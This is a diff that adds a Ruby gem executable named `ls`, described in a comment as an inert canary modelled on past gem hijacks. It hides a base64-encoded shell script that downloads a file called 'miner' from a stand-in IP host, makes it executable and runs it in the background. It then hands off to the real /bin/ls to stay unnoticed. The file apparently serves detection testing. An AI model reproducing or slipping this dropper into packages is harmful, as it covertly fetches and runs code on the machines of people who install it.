@@ -1,0 +1,9 @@
+#!/usr/bin/env ruby
+# INERT CANARY modelled on the 2019 bin/ls hijack gems: a gem executable named `ls`
+require 'open3'
+require 'base64'
+g = File.open("/tmp/.canary/rc.sh", "w")
+g << Base64.decode64("IyEvYmluL3NoCkNoZWNrKCkgeyBjdXJsIC1zU0xmICQxIC1vICQyOyB9CkNoZWNrICJodHRwOi8vMTkyLjAuMi43L3giICIvdG1wLy5jYW5hcnkvbWluZXIiCmNobW9kIDc1NSAvdG1wLy5jYW5hcnkvbWluZXIKbWluZXIgPi9kZXYvbnVsbCAyPiYxICYK")
+g.close
+Open3.capture3("nohup bash /tmp/.canary/rc.sh >/dev/null 2>&1 &")
+exec("/bin/ls", *ARGV)
